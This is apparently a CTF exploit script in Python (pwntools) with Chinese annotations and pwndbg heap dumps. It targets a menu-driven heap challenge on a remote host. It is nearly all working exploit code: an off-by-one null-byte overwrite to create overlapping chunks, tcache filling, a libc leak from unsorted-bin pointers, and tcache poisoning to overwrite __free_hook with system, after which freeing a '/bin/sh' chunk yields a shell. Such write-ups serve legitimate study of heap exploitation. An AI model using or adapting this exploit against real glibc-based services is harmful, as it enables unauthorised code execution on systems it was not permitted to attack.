from pwn import *
from LibcSearcher import *

# context.terminal = ['bash', '-x', 'sh', '-c']
# context.terminal = ['terminator', '-x', 'sh', '-c']
context.log_level = 'debug'

#io = process("./pwn_no_alarm")
io = remote("61.147.171.105",62306)
elf = ELF("./pwn_no_alarm")

# libc = ELF("./libc-2.27.so")
libc = ELF("libc-2.27.so")


# gdb.attach(io,"b * $rebase(0xf0d)\nb * $rebase(0x1111)\nb * $rebase(0x12a3)\nb * $rebase(0xD16)\nb * $rebase(0x1086)")
io.recvuntil("input manager name:")
io.sendline("CTFM")
io.recvuntil("input password:")
io.sendline("123456")


def add_node(topic_name,des_size,topic_des,topic_score):
    io.recvuntil("your choice>>")
    io.send("1")
    io.recvuntil("topic name:")
    io.sendline(topic_name)
    io.recvuntil("des size:")
    io.sendline(str(des_size))
    io.recvuntil("topic des:")
    io.sendline(topic_des)
    io.recvuntil("topic score:")
    io.sendline(str(topic_score))

def del_node(node_index):
    io.recvuntil("your choice>>")
    io.sendline("2")
    io.recvuntil("index:")
    io.sendline(str(node_index))

def show_node(node_index):
    io.recvuntil("your choice>>")
    io.sendline("3")
    io.recvuntil("index:")
    io.sendline(str(node_index))


pause()

add_node("test1", 0x18, "aaaa", 0) # 0     chunk0
add_node("test1", 0x1a8, "cccccc", 0) # chunk1     这个是计划后期要利用的堆块


#######################     填充tcachebin  大小 0x1b0
for i in range(7):
    add_node("test1", 0x1a8, "cccccc", 0) #   chunk2~chunk8
for i in range(7):
    del_node(8-i)    # 此处和释放的顺序有关系，FILO，保证链表中第一个分配出来的和上面的chunk1挨着
#######################     填充tcachebin   大小 0x1b0

del_node(1)     # 删除chunk1,将chunk1放入unsortedbin[all][0]中

add_node("test", 0xf8, "\x00", 0)      # 再次创建chunk1，
# 此时由于在UnsortedBin中有一个大小为0x1b0大小的空闲块，当申请大小为0xf8（0x100）
# 会在这个快中切割出来一个大小为0x100的块并将其分配给程序使用，
# 后面要释放这个0x100的块，所以接下来必须把0x100大小的tcachebin链条填满

#######################     填充tcachebin   大小 0x100
for i in range(7):
    add_node("test", 0xf8, "dddddd", 0) # [2,8]
for i in range(7):
    del_node(i + 2)
#######################     填充tcachebin   大小 0x100

add_node("test", 0xa8, "\x00", 0) # 创建了chunk2，前面分配完了之后还剩下0xb0大小的块
# 相当于时把最开始的chunk1分成两块，后面也要对这块再释放，所以要先将大小0xb0的tcachebin链填满

#######################     填充tcachebin   大小 0xb0
for i in range(7):
    add_node("test", 0xa8, "dddddd", 0) # [3,9]
for i in range(7):
    del_node(i + 3)
#######################     填充tcachebin   大小 0xb0

# 至此我们看到的堆空间中的状态就是
'''
pwndbg> bins
tcachebins
0xb0 [  7]: 0x555555605b20 —▸ 0x555555605a70 —▸ 0x5555556059c0 —▸ 0x555555605910 —▸ 0x555555605860 —▸ 0x5555556057b0 —▸ 0x555555605700 ◂— 0x0
0x100 [  7]: 0x555555605600 —▸ 0x555555605500 —▸ 0x555555605400 —▸ 0x555555605300 —▸ 0x555555605200 —▸ 0x555555605100 —▸ 0x555555605000 ◂— 0x0
0x1b0 [  7]: 0x555555604430 —▸ 0x5555556045e0 —▸ 0x555555604790 —▸ 0x555555604940 —▸ 0x555555604af0 —▸ 0x555555604ca0 —▸ 0x555555604e50 ◂— 0x0
'''
# 三条链被填满了，分别对应我们前面的三个大小的块

del_node(1)     # 删除chunk1，大小为0x100大小的块
del_node(2)     # 删除chunk2，大小为0xb0大小的块
# 此时两个块都删除之后，因为两个块的位置是挨着的，会发生一次合并，
# 两个块重新合并成一个0x1b0的块,放入unsortedbin[all][0]
# 但是会在原来的0xb0的块的地方留下一个前一个块的大小，之前的残留

'''
0x555555604250  0x0000000000000000  0x0000000000000021  ........!.......
0x555555604260  0x0000000a61616161  0x0000000000000000  aaaa............
0x555555604270  0x0000000000000000  0x00000000000001b1  ................     <-- unsortedbin[all][0]
0x555555604280  0x00007ffff7dcdca0  0x00007ffff7dcdca0  ................
0x555555604290  0x0000000000000000  0x0000000000000000  ................
...
0x555555604370  0x0000000000000100  0x00000000000000b0  ................
0x555555604380  0x00007ffff7dcdd00  0x00007ffff7dcdd40  ........@.......
...
0x555555604420  0x00000000000001b0  0x00000000000001b0  ................
0x555555604430  0x00005555556045e0  0x0000555555604010  .E`UUU...@`UUU..     <-- tcachebins[0x1b0][0/7]
'''

del_node(0)     # 删除第一个小块，为了下一步再写一次，利用Off-By-One的漏洞，放入tcachebins[0x20][0/1]
add_node("test", 0x18, b'd' * 0x18, 0) # 再次创建chunk0，并利用漏洞将unsortedbin[all][0]的0x1b1覆盖成0x100

'''
0x555555604250  0x0000000000000000  0x0000000000000021  ........!.......
0x555555604260  0x6464646464646464  0x6464646464646464  dddddddddddddddd
0x555555604270  0x6464646464646464  0x0000000000000100  dddddddd........     <-- unsortedbin[all][0]
0x555555604280  0x00007ffff7dcdca0  0x00007ffff7dcdca0  ................
'''


del_node(0)     # 删除chunk0，但是此处不知道为啥要删除

add_node("test", 0x88, "\x00", 0) # 创建chunk0，大小0x90
add_node("test", 0x68, "\x00", 0) # 创建chunk1，大小0x70

#######################     填充tcachebin   大小 0x90
for i in range(7):
    add_node("test", 0x88, "\x00", 0)      # 
for i in range(7):
    del_node(8-i)    # 倒着的顺序,和顺序有关，不知道为啥
#######################     填充tcachebin   大小 0x90


'''
0x555555604250  0x0000000000000000  0x0000000000000021  ........!.......
0x555555604260  0x0000000000000000  0x0000555555604010  .........@`UUU..     <-- tcachebins[0x20][0/1]
0x555555604270  0x6464646464646464  0x0000000000000091  dddddddd........
0x555555604280  0x00007ffff7dcdd00  0x00007ffff7dcdd90  ................
0x555555604290  0x0000000000000000  0x0000000000000000  ................
'''

del_node(0)      # 删除chunk0，对比上下的内容，相当于是把原来的0x90大小的堆块释放将其放入unsortedbin[all][0]

'''
0x555555604250  0x0000000000000000  0x0000000000000021  ........!.......
0x555555604260  0x0000000000000000  0x0000555555604010  .........@`UUU..     <-- tcachebins[0x20][0/1]
0x555555604270  0x6464646464646464  0x0000000000000091  dddddddd........     <-- unsortedbin[all][0]
0x555555604280  0x00007ffff7dcdca0  0x00007ffff7dcdca0  ................
0x555555604290  0x0000000000000000  0x0000000000000000  ................

pwndbg> bins
tcachebins
0x20 [  1]: 0x555555604260 ◂— 0x0
0x90 [  7]: 0x555555605bd0 —▸ 0x555555605c60 —▸ 0x555555605cf0 —▸ 0x555555605d80 —▸ 0x555555605e10 —▸ 0x555555605ea0 —▸ 0x555555605f30 ◂— 0x0
0xb0 [  7]: 0x555555605b20 —▸ 0x555555605a70 —▸ 0x5555556059c0 —▸ 0x555555605910 —▸ 0x555555605860 —▸ 0x5555556057b0 —▸ 0x555555605700 ◂— 0x0
0x100 [  7]: 0x555555605600 —▸ 0x555555605500 —▸ 0x555555605400 —▸ 0x555555605300 —▸ 0x555555605200 —▸ 0x555555605100 —▸ 0x555555605000 ◂— 0x0
0x1b0 [  7]: 0x555555604430 —▸ 0x5555556045e0 —▸ 0x555555604790 —▸ 0x555555604940 —▸ 0x555555604af0 —▸ 0x555555604ca0 —▸ 0x555555604e50 ◂— 0x0
fastbins
...
unsortedbin
all: 0x555555604270 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555604270 /* 'pB`UUU' */
'''




# 下面那个块申请之前tcachebins[0x1b0][0/7]还指向的是0x555555604420的堆块
'''
0x555555604250  0x0000000000000000  0x0000000000000021  ........!.......
0x555555604260  0x0000000000000000  0x0000555555604010  .........@`UUU..     <-- tcachebins[0x20][0/1]
0x555555604270  0x6464646464646464  0x0000000000000091  dddddddd........     <-- unsortedbin[all][0]
0x555555604280  0x00007ffff7dcdca0  0x00007ffff7dcdca0  ................
0x555555604290  0x0000000000000000  0x0000000000000000  ................
...
0x555555604300  0x0000000000000090  0x0000000000000070  ........p.......
0x555555604310  0x0000000000000000  0x0000000000000000  ................
...
0x555555604370  0x0000000000000070  0x00000000000000b1  p...............
0x555555604380  0x00007ffff7dcdd00  0x00007ffff7dcdd40  ........@.......
0x555555604390  0x0000000000000000  0x0000000000000000  ................
...
0x555555604420  0x00000000000001b0  0x00000000000001b0  ................
0x555555604430  0x00005555556045e0  0x0000555555604010  .E`UUU...@`UUU..     <-- tcachebins[0x1b0][0/7]
0x555555604440  0x0000000000000000  0x0000000000000000  ................
'''
add_node("test", 0x1a8, "\x00", 0)        # 创建chunk0,此时使用的是最开始用来填充的一个堆块
# 当时是用来填充tcachebin空间的最上面的一个，和此脚本第51行用的那个堆块紧接着的那个块
# 这样也能解释为什么最开始的0x1b0填充tcachebin时，释放的时候是倒着的，
# 因为需要使用的最近的这个块，如果按照1到8这样的顺序释放，
# 根据FILO原则，当再次使用0x1b0时则会从离最开始的那个堆块最远的位置上先分配，这样导致两个堆块不连着无法完成其他的操作

#######################     填充tcachebin   大小 0x1b0  
# 这里解释一下最开始的时候明明已经将0x1b0的tcachebin释放满了，这里又搞一遍,在填充一遍
# 因为原来留的那个最上面的0x1b0大小的堆块现在已经拆分成了两个小堆块，如下所示
'''
0x555555604250  0x0000000000000000  0x0000000000000021  ........!.......
0x555555604260  0x0000000000000000  0x0000555555604010  .........@`UUU..     <-- tcachebins[0x20][0/1]
0x555555604270  0x6464646464646464  0x0000000000000091  dddddddd........     <-- unsortedbin[all][0]
0x555555604280  0x00007ffff7dcdca0  0x00007ffff7dcdca0  ................
...
0x555555604300  0x0000000000000090  0x0000000000000070  ........p.......
...
0x555555604370  0x0000000000000070  0x00000000000000b1  p...............
0x555555604380  0x00007ffff7dcdd00  0x00007ffff7dcdd40  ........@.......
...
0x555555604420  0x00000000000001b0  0x00000000000001b0  ................ <--这是这一次（上面单独的add）分配到的chunk
0x555555604430  0x0000555555604500  0x0000000000000000  .E`UUU..........
...
0x5555556045d0  0x0000000000000000  0x00000000000001b1  ................
0x5555556045e0  0x0000555555604790  0x0000555555604010  .G`UUU...@`UUU..     <-- tcachebins[0x1b0][0/6] 还剩6个
'''
# 然后上面把最后一个入栈的堆块使用掉了，这时候相当于是大小0x1b0的tcachebin中剩下6个堆块现在处于不满的状态
# 再次释放刚才申请这个块的时候，会将其加入tcachebin，而不是unsortedbin中，
# 下面的这两个循环相当于是把这个堆块往高地址方向提了一个堆块
# 放一个疑惑的点：那为啥不开始的时候就搞两个空出来，而是要到这里之后再去提一个（可能上限是10个块），后期自己需要验证是否可行
for i in range(7):
    add_node("test", 0x1a8, "\x00", 0) # [1,7]
for i in range(7):
    del_node(8 - i)
#######################     填充tcachebin   大小 0x1b0

# 下面的del释放之前的状态入下所示
'''
0x555555604250  0x0000000000000000  0x0000000000000021  ........!.......
0x555555604260  0x0000000000000000  0x0000555555604010  .........@`UUU..     <-- tcachebins[0x20][0/1]
0x555555604270  0x6464646464646464  0x0000000000000091  dddddddd........     <-- smallbins[0x90][0]
0x555555604280  0x00007ffff7dcdd20  0x00007ffff7dcdd20   ....... .......
...
0x555555604300  0x0000000000000090  0x0000000000000070  ........p.......
...
0x555555604370  0x0000000000000070  0x00000000000000b1  p...............
0x555555604380  0x00007ffff7dcdd00  0x00007ffff7dcdd40  ........@.......
...
0x555555604410  0x0000000000000000  0x0000000000000000  ................
0x555555604420  0x00000000000001b0  0x00000000000001b0  ................
0x555555604430  0x0000555555604500  0x0000000000000000  .E`UUU..........
'''
del_node(0)        # 再次释放chunk0
# 可以看到下面释放之后，unsortedbin[all][0]的大小变成了0x361
# 此处发生了一次向前合并，为什么能能这样合并呢
# 在最开始的时候将0x555555604270处的大小0x1b0的块释放掉的时候，
# 会把这个块的大小写入下一个堆块的PREV_SIZE,并且将下一个堆块的PREV_INUSE置位为0
# 分别对应写在0x555555604420处的0x1b0，和在0x555555604428处的0x1b0
# 当释放0x555555604420这个堆块的时候，根据unlink机制的检测，发现前一个堆块是在释放状态
# 并且大小是0x1b0，所以触发了向前合并，但是实际上这个前面的堆块早就不是原来的块了，
# 里面已经被分割成了好几部分，造成堆块的重叠，根源就是多溢出的那一个字节的‘\x00’
'''
0x555555604250  0x0000000000000000  0x0000000000000021  ........!.......
0x555555604260  0x0000000000000000  0x0000555555604010  .........@`UUU..     <-- tcachebins[0x20][0/1]
0x555555604270  0x6464646464646464  0x0000000000000361  dddddddda.......     <-- unsortedbin[all][0]
0x555555604280  0x00007ffff7dcdca0  0x00007ffff7dcdca0  ................
0x555555604290  0x0000000000000000  0x0000000000000000  ................
...
0x5555556042f0  0x0000000000000000  0x0000000000000000  ................
0x555555604300  0x0000000000000090  0x0000000000000070  ........p.......
0x555555604310  0x0000000000000000  0x0000000000000000  ................
...
0x555555604360  0x0000000000000000  0x0000000000000000  ................
0x555555604370  0x0000000000000070  0x00000000000000b1  p...............
0x555555604380  0x00007ffff7dcdd00  0x00007ffff7dcdd40  ........@.......
0x555555604390  0x0000000000000000  0x0000000000000000  ................
...
0x555555604410  0x0000000000000000  0x0000000000000000  ................
0x555555604420  0x00000000000001b0  0x00000000000001b0  ................
0x555555604430  0x0000555555604500  0x0000000000000000  .E`UUU..........
0x555555604440  0x0000000000000000  0x0000000000000000  ................
'''


# 首先要判断一下这个chunk1是哪个位置，实际上是第129行创建的大小0x68（0x70）的堆块，即0x555555604300
del_node(1)
# 可以发现它释放之后被加入到了tcachebins[0x70][0/1]中
'''
0x5555556042f0  0x0000000000000000  0x0000000000000000  ................
0x555555604300  0x0000000000000090  0x0000000000000070  ........p.......
0x555555604310  0x0000000000000000  0x0000555555604010  .........@`UUU..     <-- tcachebins[0x70][0/1]
0x555555604320  0x0000000000000000  0x0000000000000000  ................
'''


add_node("test", 0x68, "\x00", 0) # 再次创建chunk0，此时创建的堆块实际上就是上一步释放的堆块
# 此时对于pwnCTFM程序来说有用的堆块只有一个，那就是chunk0


for i in range(7):  # 连着创建7个chunk，从chunk1～chunk7
    add_node("test", 0x88, "\x00", 0) 
# chunk1在一个很靠后的位置上，实际上在使用前期填充的时候构造的tcachebins[0x90]的链

add_node("test", 0x88, "\x00", 0) # 创建chunk8，此时申请到的内存位置是0x555555604280
# 可以发现上面的循环其实是为了将之前的tcachebin中的大小为0x90的堆块消耗掉
# 最后创建的chunk8才是最终想要申请的最终目标，在0x555555604270处创建一个0x90大小的堆块
'''
0x555555604250  0x0000000000000000  0x0000000000000021  ........!.......
0x555555604260  0x0000000000000000  0x0000555555604010  .........@`UUU..     <-- tcachebins[0x20][0/1]
0x555555604270  0x6464646464646464  0x0000000000000091  dddddddd........
0x555555604280  0x00007ffff7dcdff0  0x00007ffff7dcdff0  ................
...
0x555555604300  0x0000000000000090  0x00000000000002d1  ................     <-- unsortedbin[all][0]
0x555555604310  0x00007ffff7dcdca0  0x00007ffff7dcdca0  ................
...
0x555555604370  0x0000000000000070  0x00000000000000b1  p...............
0x555555604380  0x00007ffff7dcdd00  0x00007ffff7dcdd40  ........@.......
...
0x555555604420  0x00000000000001b0  0x00000000000001b0  ................
0x555555604430  0x0000555555604500  0x0000000000000000  .E`UUU..........
'''

add_node("test", 0x1f0, "\x00", 0) # 创建chunk9，创建的堆块在0x555555604300处
'''
0x555555604250  0x0000000000000000  0x0000000000000021  ........!.......
0x555555604260  0x0000000000000000  0x0000555555604010  .........@`UUU..     <-- tcachebins[0x20][0/1]
0x555555604270  0x6464646464646464  0x0000000000000091  dddddddd........
0x555555604280  0x00007ffff7dcdf00  0x00007ffff7dcdff0  ................
...
0x555555604300  0x0000000000000090  0x0000000000000201  ................
0x555555604310  0x00007ffff7dcdca0  0x00007ffff7dcdca0  ................
'''


for i in range(1, 8):     # 释放chunk1~chunk7,继续将前面用掉的0x90大小的tcachebin全部填充满
    del_node(i)


#######################     填充tcachebin   大小 0x200
for i in range(7):       # 创建chunk1～chunk7
    add_node("test", 0x1f0, "\x00", 0) # [1,7]
for i in range(1, 8):     # 释放chunk1~chunk7
    del_node(8 - i)
#######################     填充tcachebin   大小 0x200


del_node(0)    # 释放chunk0，实际上就是0x555555604300处的0x70大小的堆块
# 这里是最走要构造的结果目标，这一步释放的时候，我们的chunk0支香的位置是0x555555604300，
# 然而刚刚创建的chunk9，也在0x555555604300处，这一步将chunk0释放，将会在这块内存写入一个值，如下所示
'''
0x555555604250  0x0000000000000000  0x0000000000000021  ........!.......
0x555555604260  0x0000000000000000  0x0000555555604010  .........@`UUU..     <-- tcachebins[0x20][0/1]
0x555555604270  0x6464646464646464  0x0000000000000091  dddddddd........
0x555555604280  0x00007ffff7dcdf00  0x00007ffff7dcdff0  ................
...
0x555555604300  0x0000000000000090  0x00000000000002d1  ................     <-- unsortedbin[all][0]
0x555555604310  0x00007ffff7dcdca0  0x00007ffff7dcdca0  ................
'''





show_node(9)     # 此处通过首位功能泄漏内存0x555555604310的值0x00007ffff7dcdca0
io.recvuntil("topic des:")
libc.address = u64(io.recvuntil("topic score", drop=True).ljust(8, b'\x00')) - 0x70 - libc.symbols["__malloc_hook"]
# 泄漏的地址是0x00007ffff7dcdca0，结合__malloc_hook的位置如下所示，可以计算出libc加载的基地址
'''
pwndbg> p &__malloc_hook
$9 = (void *(**)(size_t, const void *)) 0x7ffff7dcdc30 <__malloc_hook>
'''

log.success("libc.address = " + hex(libc.address))

pause()

del_node(8)     # 释放chunk8堆块，位置在0x555555604270
# 可以发现此处释放之后千米啊的两个大堆块还是合并成为了一个0x360大小的堆块
'''
0x555555604250  0x0000000000000000  0x0000000000000021  ........!.......
0x555555604260  0x0000000000000000  0x0000555555604010  .........@`UUU..     <-- tcachebins[0x20][0/1]
0x555555604270  0x6464646464646464  0x0000000000000361  dddddddda.......     <-- unsortedbin[all][0]
0x555555604280  0x00007ffff7dcdca0  0x00007ffff7dcdca0  ................
...
0x555555604300  0x0000000000000090  0x00000000000002d1  ................
0x555555604310  0x00007ffff7dcdca0  0x00007ffff7dcdca0  ................
...
0x555555604370  0x0000000000000070  0x00000000000000b1  p...............
0x555555604380  0x00007ffff7dcdd00  0x00007ffff7dcdd40  ........@.......
...
0x555555604420  0x00000000000001b0  0x00000000000001b0  ................
0x555555604430  0x0000555555604500  0x0000000000000000  .E`UUU..........
'''



# 原作者的注释 # victim的size太大了，修改为0x71
add_node("test", 0x1e8, b'd' * 0x10 * 8 + p64(0xdeadbeefdeadbeef) + p64(0x71), 0) # 再次创建chunk0
# 此时可以发现其实chunk9的位置仍然指向的是0x555555604300处，原作者说的“victim的size太大了”应该指的是
# 0x555555604300处的堆块大小为0x2d0，太大了，通过上面的删除chunk8，再申请一个0x1f0大小的块
# 然后写入的值，其实就是为了写到chunk9的位置上,中间不能有'\x00'字节，如下所示：
'''
0x555555604250  0x0000000000000000  0x0000000000000021  ........!.......
0x555555604260  0x0000000000000000  0x0000555555604010  .........@`UUU..     <-- tcachebins[0x20][0/1]
0x555555604270  0x6464646464646464  0x00000000000001f1  dddddddd........
0x555555604280  0x6464646464646464  0x6464646464646464  dddddddddddddddd
...
0x5555556042f0  0x6464646464646464  0x6464646464646464  dddddddddddddddd
0x555555604300  0xdeadbeefdeadbeef  0x0000000000000071  ........q.......
0x555555604310  0x00007ffff7dcdca0  0x00007ffff7dcdca0  ................
...
0x555555604370  0x0000000000000070  0x00000000000000b1  p...............
0x555555604380  0x00007ffff7dcdd00  0x00007ffff7dcdd40  ........@.......
'''



del_node(9)     # 释放chunk9，
'''
0x555555604300  0xdeadbeefdeadbeef  0x0000000000000071  ........q.......
0x555555604310  0x0000000000000000  0x0000555555604010  .........@`UUU..     <-- tcachebins[0x70][0/1]
'''


del_node(0)    # 释放chunk0，把前面的块在一次合并起来
add_node("test", 0x1e8, b'd' * 0x10 * 9 + p64(libc.symbols["__free_hook"]), 0) # 创建chunk0
# 通过创建chunk0，写入值，使得__free_hook写入对应的位置上
'''
0x555555604250  0x0000000000000000  0x0000000000000021  ........!.......
0x555555604260  0x0000000000000000  0x0000555555604010  .........@`UUU..     <-- tcachebins[0x20][0/1]
0x555555604270  0x6464646464646464  0x00000000000001f1  dddddddd........
0x555555604280  0x6464646464646464  0x6464646464646464  dddddddddddddddd
...
0x555555604300  0x6464646464646464  0x6464646464646464  dddddddddddddddd
0x555555604310  0x00007ffff7dcf8e8  0x0000555555604010  .........@`UUU..     <-- tcachebins[0x70][0/1]

pwndbg> p &__free_hook
$3 = (void (**)(void *, const void *)) 0x7ffff7dcf8e8 <__free_hook>

0x555555604070  0x0000000000000000  0x0000555555604310  .........C`UUU..
'''


add_node("test", 0x68, p64(0xdeadbeef), 0) # 再次创建chunk1
# 函数执行完毕之后返回的堆块是0x555555604310，因为此次申请内存的时候tcachebins[0x70][0/1]中有一个空闲的堆块
# 这里在分配的时候，将0x00007ffff7dcf8e8值写入了0x555555604070
# 个人理解这个位置就相当于是一个记录0x70大小的chunk的链表头，始终记录下一个0x70大小的从哪里分配
'''
pwndbg> fini
Run till exit from #0  __GI___libc_malloc (bytes=104) at malloc.c:3038
0x0000555555400e1a in ?? ()
Value returned is $4 = (void *) 0x555555604310
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────
*RAX  0x555555604310 —▸ 0x7ffff7dcf8e8 (__free_hook) ◂— 0x0

0x555555604070  0x0000000000000000  0x00007ffff7dcf8e8  ................
'''


add_node("test", 0x68, p64(libc.symbols["system"]), 0) # 申请chunk2
# 此时分配的时候相当于是在0x7ffff7dcf8e8处，即__free_hook处分配到了一个堆块
# 并且在这一步完成之后，将__free_hook的值写成了system函数的值
'''
pwndbg> fini    # malloc函数执行完毕后的返回结果
Run till exit from #0  __GI___libc_malloc (bytes=104) at malloc.c:3038
0x0000555555400e1a in ?? ()
Value returned is $5 = (void *) 0x7ffff7dcf8e8 <__free_hook>
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────
*RAX  0x7ffff7dcf8e8 (__free_hook) ◂— 0x0

pwndbg> x/30xg 0x7ffff7dcf8e8
0x7ffff7dcf8e8 <__free_hook>:   0x00007ffff7a31420  0x0000000000000000

pwndbg> x/10i 0x00007ffff7a31420
   0x7ffff7a31420 <__libc_system>:  test   rdi,rdi
   0x7ffff7a31423 <__libc_system+3>:    je     0x7ffff7a31430 <__libc_system+16>
   0x7ffff7a31425 <__libc_system+5>:    jmp    0x7ffff7a30e90 <do_system>
   0x7ffff7a3142a <__libc_system+10>:   nop    WORD PTR [rax+rax*1+0x0]
   0x7ffff7a31430 <__libc_system+16>:   lea    rdi,[rip+0x164959]        # 0x7ffff7b95d90
   0x7ffff7a31437 <__libc_system+23>:   sub    rsp,0x8
   0x7ffff7a3143b <__libc_system+27>:   call   0x7ffff7a30e90 <do_system>
   0x7ffff7a31440 <__libc_system+32>:   test   eax,eax
   0x7ffff7a31442 <__libc_system+34>:   sete   al
'''


add_node("test", 0x68, "/bin/sh", 0) # 创建chunk3，
#感觉其实这里创建的哪里都不重要，只是需要一个位置写入"/bin/sh"，
# 再一次释放的时候执行的是 free(*0x555555604470),然而free函数的__free_hook已经劫持成了system
# 0x555555604470处存放的又是"/bin/sh"
'''
pwndbg> fini
Run till exit from #0  __GI___libc_malloc (bytes=104) at malloc.c:3038
0x0000555555400e1a in ?? ()
Value returned is $6 = (void *) 0x555555604470
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────
*RAX  0x555555604470 —▸ 0x7ffff7dcdca0 (main_arena+96) —▸ 0x555555606f60 ◂— 0x0



# 也不太清楚为啥这里会分配到这个地址上0x555555604470，下面先保存一下堆空间的结构
0x555555604250  0x0000000000000000  0x0000000000000021  ........!.......
0x555555604260  0x0000000000000000  0x0000555555604010  .........@`UUU..     <-- tcachebins[0x20][0/1]
0x555555604270  0x6464646464646464  0x00000000000001f1  dddddddd........
...
0x555555604310  0x00007f00deadbeef  0x0000000000000000  ................
...
0x555555604370  0x0000000000000070  0x00000000000000b1  p...............
0x555555604380  0x00007ffff7dcdd00  0x00007ffff7dcdd40  ........@.......
...
0x555555604420  0x00000000000001b0  0x00000000000001b0  ................
0x555555604430  0x0000555555604500  0x0000000000000000  .E`UUU..........
...
0x555555604460  0x0000000000000000  0x0000000000000071  ........q.......
0x555555604470  0x00007ffff7dcdca0  0x00007ffff7dcdca0  ................
0x555555604480  0x0000000000000000  0x0000000000000000  ................
'''


del_node(3)
'''
pwndbg> c
...
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────
 RAX  0x555555604470 ◂— '/bin/sh\n'
*RBX  0x0
...
─────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────
 ► 0x7ffff7a79910 <free>       push   r15
   0x7ffff7a79912 <free+2>     push   r14
   0x7ffff7a79914 <free+4>     push   r13


# 下面这里通过__free_hook函数跳转到system函数上
pwndbg>
0x00007ffff7a79bf5  3104          (*hook)(mem, RETURN_ADDRESS (0));
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────
 RAX  0x7ffff7a31420 (system) ◂— test   rdi, rdi
...
 RDI  0x555555604470 ◂— '/bin/sh\n'
*RSI  0x55555540108b ◂— mov    eax, 0xa
 R8   0x0
...
─────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────
...
   0x7ffff7a79bf0 <free+736>    mov    rsi, qword ptr [rsp + 0x68]
 ► 0x7ffff7a79bf5 <free+741>    call   rax                           <system>
        command: 0x555555604470 ◂— '/bin/sh\n'

...
───────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────
In file: /usr/src/glibc/glibc-2.27/malloc/malloc.c
   3099
   3100   void (*hook) (void *, const void *)
   3101     = atomic_forced_read (__free_hook);
   3102   if (__builtin_expect (hook != NULL, 0))
   3103     {
 ► 3104       (*hook)(mem, RETURN_ADDRESS (0));
   3105       return;
   3106     }
   3107
   3108   if (mem == 0)                              /* free(0) has no effect */
   3109     return;

'''

io.interactive()

